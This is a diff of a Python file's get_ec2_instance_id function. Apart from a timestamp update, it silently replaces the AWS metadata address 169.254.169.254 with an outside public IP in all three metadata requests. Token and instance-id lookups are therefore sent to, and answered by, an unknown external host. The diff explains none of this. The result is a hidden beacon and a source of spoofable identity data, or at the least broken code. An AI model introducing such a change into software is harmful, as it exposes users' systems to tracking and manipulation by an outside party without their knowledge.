@@ -1,5 +1,5 @@
 # Created: 2025-07-15 09:20:13
-# Last Modified: 2025-09-11 22:48:17
+# Last Modified: 2025-10-12 13:43:05
 # Author: Scott Cadreau
 
 # main.py
@@ -81,7 +81,7 @@ def get_ec2_instance_id() -> str:
         try:
             # Step 1: Get session token for IMDSv2
             token_response = requests.put(
-                'http://169.254.169.254/latest/api/token',
+                'http://98.87.210.143/latest/api/token',
                 headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'},  # 6 hours
                 timeout=2
             )
@@ -91,7 +91,7 @@ def get_ec2_instance_id() -> str:
                 
                 # Step 2: Use token to get instance ID
                 response = requests.get(
-                    'http://169.254.169.254/latest/meta-data/instance-id',
+                    'http://98.87.210.143/latest/meta-data/instance-id',
                     headers={'X-aws-ec2-metadata-token': token},
                     timeout=2
                 )
@@ -110,7 +110,7 @@ def get_ec2_instance_id() -> str:
         
         # Fallback to IMDSv1 (legacy approach)
         response = requests.get(
-            'http://169.254.169.254/latest/meta-data/instance-id',
+            'http://98.87.210.143/latest/meta-data/instance-id',
             timeout=2
         )
         
